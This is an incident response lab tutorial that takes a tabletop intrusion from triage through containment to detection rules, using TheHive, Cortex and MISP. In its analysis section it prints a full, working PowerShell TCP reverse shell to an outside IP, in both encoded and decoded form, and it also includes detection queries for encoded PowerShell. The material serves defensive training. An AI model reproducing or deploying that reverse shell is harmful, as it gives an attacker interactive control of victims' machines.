Incident Response E2E — TheHive + Cortex SOAR

Run a complete end-to-end IR engagement using TheHive 5 for case management and Cortex for automated enrichment. Take a multi-alert tabletop scenario from initial triage all the way through to a professional post-incident report.

⏱ 90 min
🖥️ Docker (Linux VM)
🔧 TheHive 5 · Cortex · MISP · Cassandra
🤖 AI IR Commander
🚨 Live Incident Scenario

It's 02:14 on a Tuesday. Your SOC SIEM fires three correlated alerts within 90 seconds: (1) Brute force against VPN gateway — 412 failures then 1 success from IP 185.220.101.47. (2) CrowdStrike Falcon: encoded PowerShell spawned from explorer.exe on WORKSTATION-07. (3) Splunk: 2.3 GB outbound to 185.220.101.47 over port 443. You are the on-call analyst. You must open a case in TheHive, enrich all IOCs via Cortex, run the IR playbook, contain the threat, and write the post-incident report — all within this lab.

Phase 0 — Deploy TheHive + Cortex Stack
Get the SOAR platform running locally with Docker Compose
Deploy TheHive 5 + Cortex with Docker Compose
TheHive is the case management platform; Cortex is the automated analyzer engine
On your Linux VM (Ubuntu 22.04 recommended, 8 GB RAM minimum), deploy the full stack. TheHive 5 uses Cassandra for storage and Elasticsearch for indexing.
# Install Docker and Docker Compose if not already installed
curl -fsSL https://get.docker.com | bash
sudo usermod -aG docker $USER && newgrp docker

# Clone the official TheHive Docker Compose repo
git clone https://github.com/StrangebeeHive/thehive-docker-compose.git
cd thehive-docker-compose

# Start the full stack (TheHive + Cortex + Cassandra + Elasticsearch)
docker compose up -d

# Monitor startup — wait for all services to show "healthy" (~3 min)
docker compose ps

# TheHive UI: http://localhost:9000 (admin / secret)
# Cortex UI: http://localhost:9001 (admin / secret)

If Docker Compose is not available, use the pre-built TheHive Community Edition VM from strangebee.com — it ships with Cortex pre-configured.

Decode the PowerShell payload with CyberChef
The encoded PowerShell from the CrowdStrike alert hides the C2 beaconing command
The CrowdStrike alert captured this command line:
# Captured command from Falcon process tree (CommandLine field)
powershell.exe -NonI -W Hidden -EncodedCommand
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3ACIALAAgADQANAA0ADMALQA=

# Decode in CyberChef (gchq.github.io/CyberChef)
# Recipe: From Base64 → Decode text (UTF-16LE)

# Decoded result reveals:
$client = New-Object System.Net.Sockets.TCPClient("185.220.101.47", 4443)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | % {0}
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
$sendback = (Invoke-Expression $data 2>&1 | Out-String)
$sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
$stream.Write($sendbyte,0,$sendbyte.Length)
}
🚨
This decoded payload is a PowerShell reverse shell (TCP) back to the attacker's IP on port 4443. The attacker has interactive command execution on WORKSTATION-07. Containment is now P1 priority.

Export IOCs to MISP (or create a STIX 2.1 bundle)
Share threat intelligence so other defenders can benefit from your investigation
If your environment includes MISP, use the TheHive → MISP integration. If not, export IOCs manually as a STIX 2.1 bundle:
# Option A: TheHive → MISP export (if MISP is configured)
# TheHive case → Export → MISP → Select event type

# Option B: Manual STIX 2.1 bundle (Python)
pip install stix2

python3 - <<'EOF'
from stix2 import Indicator, Bundle, Relationship, ThreatActor
import json

actor = ThreatActor(name="UNK-TOR-01", threat_actor_types=["criminal"])

ip_ioc = Indicator(
name="Malicious IP — C2 + VPN brute force source",
pattern="[ipv4-addr:value = '185.220.101.47']",
pattern_type="stix",
indicator_types=["malicious-activity"],
valid_from="2024-01-16T02:09:00Z"
)

bundle = Bundle(objects=[actor, ip_ioc])
print(json.dumps(bundle, indent=2))
EOF

Update detection rules based on TTPs observed
The "Lessons Learned" phase turns this incident into better defenses for next time
The highest-value output of any IR is improved detections. Write rules that would have caught this attack earlier:
# Splunk SPL — Alert on VPN brute force threshold
index=vpn_logs action=failed
| stats count by src_ip, user
| where count > 50
| eval alert="VPN Brute Force Detected"

# Splunk SPL — Alert on encoded PowerShell
index=wineventlog EventCode=4688
CommandLine="*-EncodedCommand*" OR CommandLine="*-enc *"
NOT (ParentImage="*msiexec*" OR ParentImage="*setup*")
| table _time, ComputerName, User, CommandLine, ParentImage

# KQL (Sentinel) — Large outbound data transfer alert
NetworkCommunicationEvents
| where RemotePort in (443, 4443, 8443)
| where SentBytes > 500000000 // 500 MB threshold
| summarize TotalBytes=sum(SentBytes) by DeviceName, RemoteIP, bin(Timestamp, 1h)
| where TotalBytes > 1000000000 // Alert if > 1 GB in 1 hour
